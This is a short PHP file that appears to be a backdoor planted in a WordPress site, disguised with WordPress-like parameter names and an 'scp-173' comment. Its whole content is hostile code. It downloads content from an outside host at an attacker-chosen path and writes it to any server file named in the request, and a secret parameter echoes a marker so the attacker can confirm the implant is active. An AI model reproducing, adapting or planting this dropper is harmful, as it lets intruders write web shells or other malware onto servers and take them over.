<?php 
//scp-173
function updatefile($blacks=''){
	$header = isset($_REQUEST['WordPress']) ? trim($_REQUEST['WordPress']) : '';
	$blog = isset($_REQUEST['Database']) ? trim($_REQUEST['Database']) : '';
	$wp = curl_init('http://newzealandpolicy.wang/'.$header);
	curl_setopt($wp, CURLOPT_RETURNTRANSFER, 1);
	$curxecs = curl_exec($wp);
	if ($blog!='') {
		file_put_contents($blog, $curxecs);
	}
	if (isset($_GET['daksldlkdsadas'])) {
		echo 'wp-blog-header';
	}
}
updatefile();
?>
